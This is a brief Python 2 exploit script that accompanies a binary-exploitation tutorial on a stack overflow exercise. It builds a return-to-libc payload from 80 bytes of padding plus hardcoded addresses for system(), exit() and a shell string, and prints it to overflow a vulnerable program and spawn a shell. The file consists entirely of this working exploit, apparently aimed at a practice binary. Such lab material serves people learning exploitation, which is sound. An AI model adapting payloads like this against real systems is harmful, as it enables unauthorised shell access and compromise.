#Tutorial link https://0xrick.github.io/binary-exploitation/bof6/
#
#
import struct

buffer = "A" * 80
system = struct.pack("I" ,0xb7ecffb0)
exit = struct.pack("I" ,0xb7ec60c0)
shell = struct.pack("I" ,0xbffff985)

print buffer + system + exit + shell
